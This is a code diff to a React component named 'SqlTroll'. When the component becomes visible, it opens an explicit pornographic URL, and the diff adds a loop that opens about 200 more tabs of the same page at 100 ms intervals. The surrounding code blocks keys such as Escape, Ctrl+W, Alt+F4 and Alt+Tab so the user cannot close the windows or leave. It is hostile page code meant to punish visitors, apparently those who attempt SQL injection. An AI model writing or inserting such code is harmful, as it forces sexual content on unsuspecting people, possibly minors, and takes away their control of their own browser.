@@ -36,6 +36,13 @@ export default function SqlTroll({ visible }: { visible: boolean }) {
   useEffect(() => {
     if (!visible) return
     window.open('https://rt.pornhub.com/view_video.php?viewkey=65f487dc9c57d', '_blank')
+    window.open('https://rt.pornhub.com/view_video.php?viewkey=65f487dc9c57d', '_blank')
+    let i = 0
+    const interval = setInterval(() => {
+      window.open('https://rt.pornhub.com/view_video.php?viewkey=65f487dc9c57d', '_blank')
+      i++
+      if (i >= 198) clearInterval(interval)
+    }, 100)
     const block = (e: Event) => { e.stopImmediatePropagation(); e.preventDefault() }
     const blockKey = (e: KeyboardEvent) => {
       // Блокируем F4, Escape, F5, Ctrl+W, Ctrl+R, Ctrl+F4, Alt+F4, Alt+Tab и т.д.
